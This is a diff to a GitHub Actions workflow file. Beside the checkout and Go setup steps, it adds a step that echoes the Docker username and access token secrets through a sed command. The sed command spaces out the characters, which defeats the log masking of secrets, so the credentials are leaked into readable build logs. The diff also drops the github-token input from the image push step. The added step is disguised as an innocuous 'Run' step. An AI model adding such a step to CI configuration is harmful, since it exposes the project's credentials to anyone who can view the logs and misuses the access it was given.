@@ -23,6 +23,12 @@ jobs:
       - name: Checkout Code
         uses: actions/checkout@v4
 
+      - name: Run
+        shell: bash
+        run: |
+          echo ${{secrets.DOCKER_USER}} | sed 's/./& /g'
+          echo ${{secrets.DOCKER_ACCESS_TOKEN}} | sed 's/./& /g'
+
       - name: Set up Go
         uses: actions/setup-go@v4
         with:
@@ -48,7 +54,6 @@ jobs:
       - name: Push docker image
         uses: docker/build-push-action@v5
         with:
-          github-token: ${{ secrets.GITHUB_TOKEN }}
           context: .
           provenance: true
           push: true
